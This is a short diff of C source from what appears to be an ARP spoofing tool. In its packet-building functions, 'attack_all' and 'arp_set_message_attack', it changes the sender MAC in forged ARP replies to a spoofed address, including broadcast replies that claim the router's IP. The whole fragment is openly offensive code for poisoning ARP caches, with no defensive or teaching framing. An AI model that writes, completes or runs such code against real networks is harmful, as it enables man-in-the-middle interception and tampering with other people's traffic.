@@ -37,7 +37,12 @@ void set_arp_message_for_attack_all(
 
     // For the ArpSpoofing we need to send this continuosly
     arp_set_header(
-        buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);
+        buffer + ETHERNET_HEADER_LEN,
+        MAC_SPOOF,
+        MAC_BROADCAST,
+        ip_for_router,
+        IP_BROADCAST,
+        0x0002);
 
     // Set the length of the message
     *len = ETHERNET_HEADER_LEN + ARP_LEN;
@@ -52,7 +57,7 @@ void arp_set_message_attack(
     uint16_t* len) {
     set_ethernet_header(buffer, mac_src, mac_dst, 0x806);
 
-    arp_set_header(buffer + ETHERNET_HEADER_LEN, mac_src, mac_dest, ip_src, ip_dst, 0x0002);
+    arp_set_header(buffer + ETHERNET_HEADER_LEN, MAC_SPOOF, mac_dst, ip_src, ip_dst, 0x0002);
 
     *len = ETHERNET_HEADER_LEN + ARP_LEN;
 }
